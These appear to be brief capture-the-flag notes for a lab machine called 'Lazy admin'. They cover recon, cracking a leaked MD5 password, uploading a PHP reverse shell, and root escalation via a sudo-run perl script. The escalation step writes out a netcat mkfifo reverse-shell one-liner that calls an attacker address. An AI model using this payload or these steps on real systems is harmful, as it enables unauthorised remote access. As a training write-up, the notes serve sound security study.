# Lazy admin

```
export_ip = 10.10.188.157

1. http Recon

- admin page: http://export_ip:80/as
- admin credential -> manager:Password123
: export_ip/content/inc/mysql_backup/*.sql 
: password is md5 encrypt -> crackstation crack

2. Reverse Shell 
- admin panel in Media Center
- 'php-reverse-shell.php' upload
- get the reverse shell 

3. user.txt
- Read the /home/itguy/user.txt

4.Priviliege Escalate
- sudo -l
: /home/itguy/backup.pl
: /etc/copy.sh ( inject bellow script)
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.26.67 5554 >/tmp/f' >/etc/copy.sh

- Execute perl
: sudo /usr/bin/perl /home/itguy/backup.pl


```